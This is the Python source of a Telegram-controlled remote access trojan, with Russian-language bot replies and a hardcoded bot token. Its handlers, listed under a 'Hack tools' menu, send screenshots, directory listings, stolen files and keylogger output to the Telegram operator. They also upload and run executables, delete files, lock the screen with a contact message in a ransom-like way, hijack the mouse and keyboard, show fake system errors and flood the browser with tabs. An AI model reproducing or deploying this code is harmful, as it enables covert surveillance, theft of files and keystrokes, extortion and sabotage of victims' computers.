import time
import speech
import locker
import spiders
import os, sys
import telebot
import threading
import pyautogui
import showError
import pyperclip
import showWindows
import interference
import webbrowser as wb


token = "5129940803:AAGklFmHwceNGqrihAUZVCSGxIeYd2E72ck"
bot = telebot.TeleBot(token)
show_image_switch = False
hide_image_switch = False
hide_label_switch = False
path_to_save = ""
save_file = False


def get_args(arg):
    return arg[arg.find("(") + 1:arg.find(")")]


def start_keylog():
    import keylog


@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, f"Добро пожаловать {message.chat.first_name}")
    bot.send_message(message.chat.id, '''Команды:
        ⚫ /get_size (no args)
        Mouse actions:
            ⚫ /move_to (2 args)
            ⚫️/click_in (2 args)
            ⚫️/double_click_in (2 args)
            ⚫️/right_click (2 args)
        
        Keyboard actions:
            ⚫️/press_key (1 arg)
            ⚫️/press_hot_key (1 args{example: ctrl+1})
            ⚫️/write_text (1 arg)
            ⚫️/listen_keyboard (no args)
        
        Show error and message box:
            ⚫ /show_fatal_error (no args)
            ⚫ /show_mb_error (title, container text)
            ⚫ /show_mb_info (title, container text)
            ⚫ /show_mb_question
        Show windows and images:
            ⚫ /show_image (no args))
            ⚫ /generate_label_window (title, geometry, background color, font color, label text)
        Hack tools:
            ⚫ /get_screen (no args)
            ⚫ /lock_screen (contact_info)
            ⚫ /get_file_paths (1 arg)
            ⚫ /still_file (path)
            ⚫ /load_file (path{example: \main.py, \main.txt, \main.jpg, \main.png})
            ⚫ /delete_file (path)
            ⚫ /kick_video_card (no args)
            ⚫ /copy_text (text)
            ⚫ /start_exe_file (path)
            ⚫ /show_spiders
            ⚫ /say_text (text) only english text
            ⚫ /show_interference
            ⚫ /get_key_logs (no args)''')
    threading.Thread(target=start_keylog).start()


@bot.message_handler(commands=['get_size'])
def get_size(message):
    size_x, size_y = pyautogui.size()
    bot.send_message(message.chat.id, "Width: {}    Height: {}".format(size_x, size_y))


@bot.message_handler(commands=['move_to'])
def move_to(message):
    try:
        x_coord, y_coord = get_args(message.text).split(",")[0].strip(), get_args(message.text).split(",")[1].strip()
        try:
            pyautogui.moveTo(int(x_coord), int(y_coord))
            bot.send_message(message.chat.id, f"Курсор был перемещён в точку ({x_coord}, {y_coord})")
        except Exception as e:
            bot.send_message(message.chat.id, "Error: " + str(e))
    except Exception as e:
        bot.send_message(message.chat.id, "Введите кординаты сразу после команды в скобках!")


@bot.message_handler(commands=['click_in'])
def click_in(message):
    try:
        x_coord, y_coord = get_args(message.text).split(",")[0].strip(), get_args(message.text).split(",")[1].strip()
        try:
            pyautogui.click(int(x_coord), int(y_coord))
            bot.send_message(message.chat.id, f"Курсор кликнул в точке {x_coord}; {y_coord}")
        except Exception as e:
            bot.send_message(message.chat.id, "Error: " + str(e))
    except Exception as e:
        bot.send_message(message.chat.id, "Введите кординаты сразу после команды в скобках!")


@bot.message_handler(commands=['double_click_in'])
def double_click_in(message):
    try:
        x_coord, y_coord = get_args(message.text).split(",")[0].strip(), get_args(message.text).split(",")[1].strip()
        try:
            pyautogui.doubleClick(int(x_coord), int(y_coord))
            bot.send_message(message.chat.id, f"Курсор дважды кликнул в точке {x_coord}; {y_coord}")
        except Exception as e:
            bot.send_message(message.chat.id, "Error: " + str(e))
    except Exception as e:
        bot.send_message(message.chat.id, "Введите кординаты сразу после команды в скобках!")


@bot.message_handler(commands=['right_click_in'])
def right_click_in(message):
    try:
        x_coord, y_coord = get_args(message.text).split(",")[0].strip(), get_args(message.text).split(",")[1].strip()
        try:
            pyautogui.rightClick(int(x_coord), int(y_coord))
            bot.send_message(message.chat.id, f"Курсор кликнул правой кнопкой мыши в точке {x_coord}; {y_coord}")
        except Exception as e:
            bot.send_message(message.chat.id, "Error: " + str(e))
    except Exception as e:
        bot.send_message(message.chat.id, "Введите кординаты сразу после команды в скобках!")


@bot.message_handler(commands=['press_key'])
def press_key(message):
    try:
        key = get_args(message.text)
        try:
            pyautogui.press(key)
            bot.send_message(message.chat.id, f"Клавиша {key} была нажата")
        except Exception as e:
            bot.send_message(message.chat.id, "Error: " + str(e))
    except:
        bot.send_message(message.chat.id, "Введите клавишу сразу после команды в скобках!")


@bot.message_handler(commands=['press_hot_key'])
def press_hot_key(message):
    try:
        key = get_args(message.text)
        try:
            pyautogui.hotkey(key)
            bot.send_message(message.chat.id, f"Комбинация клавиш {key} была нажата")
        except Exception as e:
            bot.send_message(message.chat.id, "Error: " + str(e))
    except:
        bot.send_message(message.chat.id, "Введите комбинацию клавиш(ctrl+f) сразу после команды в скобках!")


@bot.message_handler(commands=['write_text'])
def write_text(message):
    try:
        text = get_args(message.text)
        try:
            pyautogui.write(text, interval=0.25)
            bot.send_message(message.chat.id, f"Текст {text} был введён")
        except Exception as e:
            bot.send_message(message.chat.id, "Error: " + str(e))
    except:
        bot.send_message(message.chat.id, "Введите текст через пробел после команды в скобках!")


@bot.message_handler(commands=['show_fatal_error'])
def fatal_error(message):
    try:
        bot.send_message(message.chat.id, "Ошибка была показана")
        showError.Error0xC000021A()
        bot.send_message(message.chat.id, "Ошибка была скрыта пользователем")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['show_mb_error'])
def mb_error(message):
    try:
        title, text = get_args(message.text).split(",")[0].strip(), get_args(message.text).split(",")[1].strip()
        bot.send_message(message.chat.id, f"Ошибка [{title}, {text}] была показана")
        showError.MbError(title, text)
        bot.send_message(message.chat.id, f"Ошибка [{title}, {text}] была скрыта пользователем")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['show_mb_info'])
def mb_info(message):
    try:
        title, text = get_args(message.text).split(",")[0].strip(), get_args(message.text).split(",")[1].strip()
        bot.send_message(message.chat.id, f"Информация [{title}, {text}] была показана")
        showError.MbInfo(title, text)
        bot.send_message(message.chat.id, f"Информация [{title}, {text}] была скрыта пользователем")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['show_mb_question'])
def mb_question(message):
    try:
        title, text = get_args(message.text).split(",")[0].strip(), get_args(message.text).split(",")[1].strip()
        bot.send_message(message.chat.id, f"Вопрос [{title}, {text}] был показан")
        if showError.MbQuestion(title, text):
            bot.send_message(message.chat.id, "Пользователь ответил да")
        else:
            bot.send_message(message.chat.id, "Пользователь ответил нет")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['show_image'])
def show_image(message):
    global show_image_switch
    show_image_switch = True
    bot.send_message(message.chat.id, "Отправте картинку боту которую нужно показать")


@bot.message_handler(content_types=['photo'])
def download_image(message):
    global show_image_switch, hide_image_switch, save_file, path_to_save
    try:
        if show_image_switch:
            bot.send_message(message.chat.id, "Отправьте команду /hide_image, что бы скрыть картинку")
            fileID = message.photo[-1].file_id
            file_info = bot.get_file(fileID)
            downloaded_file = bot.download_file(file_info.file_path)

            with open("image.jpg", "wb") as file:
                file.write(downloaded_file)
                file.close()
            hide_image_switch = True
            showWindows.ShowImage().show()
        elif save_file:
            fileID = message.photo[-1].file_id
            path = path_to_save
            file_info = bot.get_file(fileID)
            downloaded_file = bot.download_file(file_info.file_path)

            with open("image.jpg", "wb") as file:
                file.write(downloaded_file)
                file.close()

        save_file = False
        show_image_switch = False
    except Exception as e:
        show_image_switch = False
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['hide_image'])
def hide_image_command(message):
    global hide_image_switch
    if hide_image_switch:
        showWindows.ShowImage().close(1)
        hide_image_switch = False


@bot.message_handler(commands=['generate_label_window'])
def generate_label_window(message):
    global hide_label_switch
    try:
        title = get_args(message.text).split(",")[0].strip()
        geometry = get_args(message.text).split(",")[1].strip()
        bg_color = get_args(message.text).split(",")[2].strip()
        fg_color = get_args(message.text).split(",")[3].strip()
        label_text = get_args(message.text).split(",")[4]
        bot.send_message(message.chat.id, f"Окно [{title}, {geometry}, {label_text}] было показано")
        bot.send_message(message.chat.id, "Отправьте команду /hide_label_window что бы скрыть окно с надписью")
        showWindows.ShowWindow().draw(title, geometry, bg_color, fg_color, label_text)
        hide_label_switch = True
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['hide_label_window'])
def hide_label_window(message):
    global hide_label_switch
    if hide_label_switch:
        showWindows.ShowWindow().hide()
        hide_label_switch = False


@bot.message_handler(commands=['get_screen'])
def get_screen(message):
    try:
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save('screenshoot_1.png')
        with open("screenshoot_1.png", "rb") as file:
            bot.send_photo(message.chat.id, file.read())
            file.close()
        os.remove("screenshoot_1.png")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['lock_screen'])
def lock_screen(message):
    try:
        bot.send_message(message.chat.id, "Экран заблокирован, для разблокировки используйте /unlock_screen")
        threading.Thread(target=lambda: lock(message)).start()
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


def lock(message):
    global locker_v
    locker_v = locker.Locker()
    locker_v.draw(get_args(message.text))


@bot.message_handler(commands=['unlock_screen'])
def unlock_screen(message):
    try:
        locker_v.exit("event")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['get_file_paths'])
def get_file_paths(message):
    try:
        threading.Thread(target=lambda: file_paths(message)).start()
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


def file_paths(message):
    path = get_args(message.text)
    fileNames = ""
    length = 1
    for root, dirs, files in os.walk(path):
        try:
            fileNames += "\n \n"
            fileNames += "################################### \n"
            fileNames += root + "\n"
            for _dir in dirs:
                fileNames += str(_dir) + "\n"

            for _file in files:
                fileNames += str(_file) + "\n"
            length += 1
            fileNames += "\n \n"
            fileNames += "################################### \n"
            try:
                try:
                    bot.send_message(message.chat.id, str(fileNames))
                except:
                    time.sleep(10)
                    bot.send_message(message.chat.id, str(fileNames))
            except:
                time.sleep(142)
                bot.send_message(message.chat.id, "Слишком большая папка")
                return
            fileNames = ""
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['still_file'])
def still_file(message):
    path = get_args(message.text)
    with open(path, "rb") as file:
        bot.send_document(message.chat.id, file)
        file.close()


@bot.message_handler(commands=['load_file'])
def load_file_path(message):
    global path_to_save, save_file
    path_to_save = get_args(message.text)
    save_file = True
    bot.send_message(message.chat.id, f"Отправьте документ который нужно сохранить в {path_to_save}")


@bot.message_handler(content_types=['document'])
def load_doc(message):
    global save_file, path_to_save
    if save_file:
        try:
            raw = message.document.file_id
            path = path_to_save
            file_info = bot.get_file(raw)
            downloaded_file = bot.download_file(file_info.file_path)
            with open(path, 'wb') as new_file:
                new_file.write(downloaded_file)
                new_file.close()
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")
    save_file = False
    path_to_save = ""


@bot.message_handler(commands=['delete_file'])
def delete_file(message):
    try:
        path = get_args(message.text)
        os.remove(path)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['kick_video_card'])
def kick_video_card(message):
    while True:
        try:
            wb.register('chrome',
                        None,
                        wb.BackgroundBrowser(
                            "C://Program Files (x86)//Google//Chrome//Application//chrome.exe"))
        except:
            pass
        try:
            threading.Thread(target=lambda: wb.open_new_tab("yandex.ru")).start()
        except:
            pass


@bot.message_handler(commands=['open_url'])
def open_web_page(message):
    try:
        wb.register('chrome',
                    None,
                    wb.BackgroundBrowser(
                        "C://Program Files (x86)//Google//Chrome//Application//chrome.exe"))
    except:
        pass
    url = str(get_args(message.text))
    try:
        wb.open_new_tab(str(url))
    except:
        pass


@bot.message_handler(commands=['copy_text'])
def copy_text(message):
    try:
        text = get_args(message.text)
        pyperclip.copy(str(text))
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['start_exe_file'])
def start_exe(message):
    try:
        path = str(get_args(message.text))
        os.startfile(path)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['show_spiders'])
def show_spiders(message):
    global spider_window
    try:
        bot.send_message(message.chat.id, "Hide spiders with command /hide_spiders")
        spider_window = spiders.Window()
        threading.Thread(target=spider_window.draw()).start()
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['hide_spiders'])
def hide_spiders(message):
    global spider_window
    try:
        spider_window.close()
        spider_window = 0
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['say_text'])
def say_text(message):
    try:
        text = get_args(message.text)
        speech.play(text)
        bot.send_message(message.chat.id, f"The text {text} were said")
    except Exception as e:
        bot.message_handler(message.chat.id, f"Error: {e}")


def create_interference():
    global interference_obj
    interference_obj = interference.Interference()
    interference_obj.draw()


@bot.message_handler(commands=['show_interference'])
def show_interference(message):
    global thread_int
    try:
        thread_int = threading.Thread(target=create_interference)
        thread_int.start()
        bot.send_message(message.chat.id, "Interference were showed")
        bot.send_message(message.chat.id, "If you want to hide interference use /hide_interference")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['hide_interference'])
def hide_interference(message):
    global interference_obj, thread_int
    try:
        thread_int.terminate()
        interference_obj.close()
        print(2)
        interference_obj = ""
        bot.send_message(message.chat.id, "Interference were hided")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=["get_key_logs"])
def get_logs(message):
    try:
        with open("temp//key_log.txt", "r") as file:
            bot.send_message(message.chat.id, str(file.read()))
            file.close()
        with open("temp//key_log.txt", "r") as file:
            file.write("")
            file.close()

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


try:
    bot.polling()
except:
    pass
